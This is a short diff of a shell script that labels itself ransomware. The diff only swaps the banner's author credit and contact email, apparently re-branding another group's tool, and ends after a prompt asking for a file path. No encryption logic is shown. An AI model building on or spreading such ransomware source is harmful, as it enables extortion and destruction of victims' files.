@@ -2,8 +2,8 @@
 clear;
 echo "
 ################
-#  Ransomware  # Contact : soracyberteam@gmail.com
-# By Cy#b3r00T # Copyright (c) 2018 Sora Cyber Team
+#  Ransomware  # Contact : yogastejak@gmail.com
+# By Mr.Pscychopat # Copyright (c) 2018 Yogas Teja Kusuma
 ################";
 echo "";
 read -p "File Path : " pathfile;
